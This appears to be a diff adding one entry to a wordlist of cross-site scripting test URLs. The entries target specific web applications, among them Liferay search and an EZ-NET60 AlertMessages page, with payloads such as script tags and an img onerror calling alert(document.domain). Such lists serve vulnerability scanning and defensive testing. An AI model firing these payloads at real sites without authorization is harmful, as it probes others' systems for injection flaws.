@@ -156,3 +156,4 @@
 /?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
 /browser_search_plugin.php?type=text%27%22()%26%25<acx><ScRiPt>alert(document.domain)</ScRiPt>
 /web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script>
+/EZ-NET60/AlertMessages.aspx?Usertext=<img%20src%3Dx%20onerror%3Dalert(document.domain)>
